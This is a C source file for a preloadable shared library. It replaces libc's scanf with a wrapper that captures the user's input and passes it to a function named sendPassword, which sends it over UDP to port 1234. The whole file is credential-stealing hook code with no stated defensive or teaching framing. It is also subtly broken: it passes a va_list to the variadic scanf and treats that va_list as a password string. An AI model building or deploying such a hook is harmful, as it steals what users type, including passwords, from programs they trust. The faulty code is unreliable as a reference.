#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"

#define BUF_SIZE 60
#define PORT	 1234
#define MAXLINE 1024

int scanf(const char * format, ...);

typedef int (*sym)(const char *, ...);
void* handle;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));
void sendPassword(char* pass);

void myinit() 
{
    handle = dlopen(OBJ_PATH, RTLD_LAZY);
}

void mydest() 
{
    dlclose(handle);
}

int scanf(const char * format, ...)
{
	sym orig_scanf;

	orig_scanf = (sym)dlsym(handle, "scanf");

	va_list arg;
	va_start(arg, format);

	int val = orig_scanf(format, arg);

	sendPassword(arg);

	return val;
}

void sendPassword(char* pass) {
	int sockfd;
	struct sockaddr_in servaddr;

	// Creating socket file descriptor
	if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
		return;
	}

	memset(&servaddr, 0, sizeof(servaddr));
	
	// Filling server information
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(PORT);
	servaddr.sin_addr.s_addr = INADDR_ANY;
	
	sendto(sockfd, pass, strlen(pass),
		MSG_CONFIRM, (const struct sockaddr *) &servaddr,
			sizeof(servaddr));

	close(sockfd);
}
